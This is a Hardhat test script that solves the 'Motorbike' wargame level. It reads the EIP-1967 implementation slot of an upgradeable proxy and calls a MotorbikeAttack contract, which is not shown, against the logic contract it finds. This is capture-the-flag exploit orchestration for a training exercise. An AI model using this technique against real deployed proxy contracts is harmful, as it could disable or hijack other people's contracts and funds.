import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

describe("Motorbike", function () {

    async function deployTokenFixture(): Promise<any> {
        accounts = await ethers.getSigners();
        [eoa] = accounts;
        const challengeFactory = await ethers.getContractFactory(`Motorbike`);
        const challengeAddress = await createChallenge(
            `0x9b261b23cE149422DE75907C6ac0C30cEc4e652A`, ethers.utils.parseEther("0.001")
        );
        challenge = await challengeFactory.attach(challengeAddress);

        const attackerFactory = await ethers.getContractFactory(`MotorbikeAttack`);
        attacker = await attackerFactory.deploy();

        return { eoa, challenge, attacker };
    }

    it("solves the challenge", async function () {
        const { eoa, challenge, attacker } = await loadFixture(deployTokenFixture);

        try {
            const implmentationAddressBytes32 = await eoa.provider?.getStorageAt(challenge.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
            console.log("implmentationAddress: " + implmentationAddressBytes32);
            const implementationAddress = ethers.utils.defaultAbiCoder.decode(["address"], implmentationAddressBytes32!)[0];
            console.log("implementationAddress: " + implementationAddress);

            tx = await attacker.attack(implementationAddress);
            await tx.wait();
        } catch (err) {
            console.log("error: " + err);
        }


    });

    after(async () => {
        expect(await submitLevel(challenge.address), "level not solved").to.be.true;
    });
});
